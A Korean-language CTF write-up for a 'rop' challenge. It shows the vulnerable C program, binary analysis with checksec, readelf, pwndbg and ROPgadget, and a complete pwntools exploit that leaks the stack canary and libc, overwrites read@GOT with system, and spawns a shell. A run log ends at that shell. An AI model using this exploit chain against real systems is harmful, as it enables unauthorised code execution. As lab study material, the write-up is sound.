# 문제 코드
```c
// Name: rop.c
// Compile: gcc -o rop rop.c -fno-PIE -no-pie

#include <stdio.h>
#include <unistd.h>

int main() {
  char buf[0x30];

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  // Leak canary
  puts("[1] Leak Canary");
  write(1, "Buf: ", 5);
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  // Do ROP
  puts("[2] Input ROP payload");
  write(1, "Buf: ", 5);
  read(0, buf, 0x100);

  return 0;
}
```


# 분석
```sh
┌──(foo1㉿main-server)-[~/Desktop/dh/rop]
└─$ checksec --file=./rop
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   68) Symbols	  No	0		2		./rop
┌──(foo1㉿main-server)-[~/Desktop/dh/rop]
└─$ file ./rop
./rop: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=2a3cdeb61fd5777406ca296e2fa0a679996adbda, not stripped
```

바이너리에서 `system` 함수를 호출하지 않아서 PLT에 등록되지 않으며, “/bin/sh” 문자열도 데이터 섹션에 기록하지 않음
따라서 `system` 함수를 익스플로잇에 사용하려면 함수의 주소를 직접 구해야 하고, “/bin/sh” 문자열을 사용할 다른 방법을 고민해야 함

read 함수를 사용할 예정인데, 로컬에서 사용하는 `libc.so.6` 파일과 서버에서 사용하는 라이브러리 파일이 조금 상이 함
따라서 로컬에서 성공시킨 후 서버 주소에 맞게 다시 주소를 설정해야 함
```sh
┌──(foo1㉿main-server)-[~/Desktop/dh/rop]
└─$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 |grep " read@"
   289: 00000000001149c0   157 FUNC    GLOBAL DEFAULT   15 read@@GLIBC_2.2.5

┌──(foo1㉿main-server)-[~/Desktop/dh/rop]
└─$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 |grep " system@"
  1481: 0000000000050d70    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5
```

```sh
┌──(foo1㉿main-server)-[~/Desktop/dh/rop]
└─$ readelf -s libc.so.6 |grep " read@"
   289: 0000000000114980   157 FUNC    GLOBAL DEFAULT   15 read@@GLIBC_2.2.5

┌──(foo1㉿main-server)-[~/Desktop/dh/rop]
└─$ readelf -s libc.so.6 |grep " system@"
  1481: 0000000000050d60    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5
```

실제 exploit 코드에선 라이브러리의 심볼들을 통해 확인했음
```python
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")read_system = libc.symbols["read"]-libc.symbols["system"]
```

`/bin/sh`을 임의 버퍼에 직접 주입하여 참조하거나, 다른 파일에 포함된 것을 사용해야 함.
아래는 바이너리에서 링킹된 라이브러리의 문자열 참조
```sh
pwndbg> file rop
Reading symbols from rop...
(No debugging symbols found in rop)
pwndbg> start
Temporary breakpoint 1 at 0x4006fb
...
pwndbg> search /bin/sh
Searching for value: '/bin/sh'
libc.so.6       0x7ffff7dd8698 0x68732f6e69622f /* '/bin/sh' */
pwndbg> x/s 0x7ffff7dd8698
0x7ffff7dd8698:	"/bin/sh"
```

pwntool로 모든 심볼 주소 가져올 수 있음`got.read: 0x601038`
```sh
┌──(foo1㉿main-server)-[~/Desktop/dh/rop]
└─$ python3 exploit.py 
[*] '/home/foo1/Desktop/dh/rop/rop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
stdout: 0x601060
stdin: 0x601070
...
_start: 0x400610
__bss_start: 0x601058
main: 0x4006f7
__TMC_END__: 0x601058
_init: 0x400580
puts: 0x4005b0
plt.puts: 0x4005b0
write: 0x4005c0
plt.write: 0x4005c0
__stack_chk_fail: 0x4005d0
plt.__stack_chk_fail: 0x4005d0
printf: 0x4005e0
plt.printf: 0x4005e0
read: 0x4005f0
plt.read: 0x4005f0
setvbuf: 0x400600
plt.setvbuf: 0x400600
__libc_start_main: 0x600ff0
got.__libc_start_main: 0x600ff0
__gmon_start__: 0x600ff8
got.__gmon_start__: 0x600ff8
got.stdout: 0x601060
got.stdin: 0x601070
got.puts: 0x601018
got.write: 0x601020
got.__stack_chk_fail: 0x601028
got.printf: 0x601030
got.read: 0x601038
got.setvbuf: 0x601040
```

가젯은 다음과 같이 찾을 수 있음
```sh
┌──(foo1㉿main-server)-[~/Desktop/dh/rop]
└─$ ROPgadget --binary ./rop --re "pop rdi"
Gadgets information
============================================================
0x0000000000400853 : pop rdi ; ret

Unique gadgets found: 1

┌──(foo1㉿main-server)-[~/Desktop/dh/rop]
└─$ ROPgadget --binary ./rop --re "pop rsi"
Gadgets information
============================================================
0x0000000000400851 : pop rsi ; pop r15 ; ret

Unique gadgets found: 1
```


# Exploit
```python
from pwn import *

e=ELF("./rop")
p=process("./rop")
#p=gdb.debug("./rop")
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")	# Change when exploit remote server

context.log_level="debug"

read_got=e.got["read"]	# 0x601038
read_plt=e.plt["read"]	# 0x4005f0
write_plt=e.plt["write"]	# 0x4005c0
binsh=0x7ffff7dd8698
pop_rdi = 0x0000000000400853
pop_rsi_r15 = 0x0000000000400851
ret = 0x0000000000400854
cnry=b'\x00'
payload=b''

buf_size=0x38
sfp_size=0x8

payload+=b'a'*(buf_size+1)
p.sendafter("Buf: ",payload)
p.recvuntil(payload)
cnry+=p.recv(7)

payload=b''
payload+=b'a'*buf_size
payload+=cnry
payload+=b'b'*sfp_size

# write(1, read_got, ...)
payload+=p64(pop_rdi)+p64(1)
payload+=p64(pop_rsi_r15)+p64(read_got)+p64(0)
payload+=p64(write_plt)

# read(0, read_got, ...)
payload+=p64(pop_rdi)+p64(0)
payload+=p64(pop_rsi_r15)+p64(read_got)+p64(0)
payload+=p64(read_plt)

# read_got + 0x8 == b'/bin/sh\x00'
# read("/bin/sh") == system("/bin/sh")
payload += p64(pop_rdi)
payload += p64(read_got + 0x8)
payload += p64(ret)
payload += p64(read_plt)

p.sendafter("Buf: ",payload)
read=u64(p.recvn(6) + b'\x00'*2)
libc_base=read-libc.symbols["read"]	# 0x1149c0
system=libc_base+libc.symbols["system"]	# 0x050d70

p.send(p64(system) + b'/bin/sh\x00')

p.interactive()
```

아래의 3개의 로직이 핵심임
1. read 함수의 GOT를 통해 메모리에 적재된 read 함수의 주소를 write하여 출력
2. read 함수의 GOT를 overwrite할 준비를 함
3. read 함수(실제로는 system)을 사용할 준비를 함
```python
# write(1, read_got, ...)
payload+=p64(pop_rdi)+p64(1)
payload+=p64(pop_rsi_r15)+p64(read_got)+p64(0)
payload+=p64(write_plt)

# read(0, read_got, ...)
payload+=p64(pop_rdi)+p64(0)
payload+=p64(pop_rsi_r15)+p64(read_got)+p64(0)
payload+=p64(read_plt)

# read_got + 0x8 == b'/bin/sh\x00'
# read("/bin/sh") == system("/bin/sh")
payload += p64(pop_rdi)
payload += p64(read_got + 0x8)
payload += p64(ret)
payload += p64(read_plt)
```

여기서 `read_got + 0x8` 가 입력을 아래와 같이 줬기 때문에 `b'/bin/sh\x00'` 임
```python
p.send(p64(system) + b'/bin/sh\x00')
```

실행결과
```sh
┌──(foo1㉿main-server)-[~/Desktop/dh/rop]
└─$ python3 exploit.py 
[*] '/home/foo1/Desktop/dh/rop/rop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process './rop': pid 20947
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
/home/foo1/.local/lib/python3.10/site-packages/pwnlib/tubes/tube.py:831: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
[*] Switching to interactive mode
\x00\x00\xf0(\xdcL\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\xa7A\xdcL\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x9aA\xdcL\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xls
Dockerfile  exploit.py    flag  libc.so.6  rop  rop.c  rop.zip
$  
```

